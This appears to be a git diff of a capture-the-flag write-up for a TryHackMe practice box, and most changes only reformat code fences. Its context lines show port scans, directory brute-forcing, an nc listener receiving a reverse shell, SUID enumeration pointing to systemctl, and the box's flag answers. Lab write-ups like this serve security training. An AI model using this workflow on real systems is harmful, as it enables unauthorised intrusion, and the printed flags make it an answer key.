@@ -9,7 +9,7 @@ The box showcases web exploiation and set uid priv escalation.
 	
 	1. Ran a quick scan for all ports
 
-	`````
+	```bash
 	sudo nmap -p- -vv 10.10.237.128
 	Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-01 22:50 EST
 	Initiating Ping Scan at 22:50                                                                                                                                         ............                                                                                                          
@@ -25,11 +25,11 @@ The box showcases web exploiation and set uid priv escalation.
 	SYN Stealth Scan Timing: About 77.43% done; ETC: 23:03 (0:02:58 remaining)
 	Discovered open port 3128/tcp on 10.10.237.128
 	SYN Stealth Scan Timing: About 82.85% done; ETC: 23:03 (0:02:17 remaining)           
-	`````
+	```
 
 	2. Then ran a standard scan for the specific ports found - **21,22,139,445,3128,3333**
 
-	`````
+	```bash
 	sudo nmap -vv -sC -sV -p21,22,139,445,3128,3333 10.10.237.128
 	Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-01 23:03 EST
 	NSE: Loaded 153 scripts for scanning.
@@ -121,7 +121,7 @@ The box showcases web exploiation and set uid priv escalation.
 	| smb2-time: 
 	|   date: 2020-11-02T04:03:42
 	|_  start_date: N/A
-	`````
+	```
 
 	3. What version of the squid proxy is running on the machine? - **3.5.12**
 
@@ -139,7 +139,8 @@ The box showcases web exploiation and set uid priv escalation.
 2. What is the directory that has an upload form page? - **/internal/** - Upload
 
 **GOBUSTER OUTPUT**
-`````
+
+```bash
 gobuster dir -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u "http://10.10.237.128:3333"
 
 ===============================================================
@@ -164,7 +165,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 2020/11/01 23:58:22 Finished
 ===============================================================
-`````
+```
 
 # Web Exploit
 
@@ -176,7 +177,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 4. Stabilizing shell
 
-`````
+```bash
 kali@kali:~/Desktop/Try_Hack_Me/Vulnversity$ nc -lnvvp 8888
 listening on [any] 8888 ...
 connect to [10.2.44.183] from (UNKNOWN) [10.10.25.49] 44380
@@ -194,29 +195,29 @@ kali@kali:~/Desktop/Try_Hack_Me/Vulnversity$ stty raw -echo
 kali@kali:~/Desktop/Try_Hack_Me/Vulnversity$ nc -lnvvp 8888
                                                                                                                                                                                                                 
 www-data@vulnuniversity:/$ l                                   
-`````
+```
 
 5. What is the name of the user who manages the webserver? - **bill**
 
-`````
+```bash
 www-data@vulnuniversity:/home$ ls
 bill
-`````
+```
 
 6. What is the user flag? - **8bd7992fbe8a6ad22a63361004cfcedb**
 
-`````
+```bash
 www-data@vulnuniversity:/home/bill$ ls
 user.txt
 www-data@vulnuniversity:/home/bill$ cat user.txt 
 8bd7992fbe8a6ad22a63361004cfcedb
-`````
+```
 
 # Privilege Escalation
 
 
 **LINPEAS OUTPUT**
-`````
+```bash
 ====================================( Interesting Files )=====================================
 [+] SUID - Check easy privesc, exploits and write perms
 [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
@@ -226,11 +227,9 @@ www-data@vulnuniversity:/home/bill$ cat user.txt
 -rwsr-sr-x 1 root   root        97K Jan 29  2019 /usr/lib/snapd/snap-confine
 -rwsr-xr-x 1 root   root       419K Jan 31  2019 /usr/lib/openssh/ssh-keysign
 -rwsr-xr-x 1 root   root       645K Feb 13  2019 /bin/systemctl
-`````
+```
 
 1. On the system, search for all SUID files. What file stands out? - **/bin/systemctl**
-
-
 
 2. What is the root flag? - **a58ff8579f0a9270368d33a9966c7fd5**
 
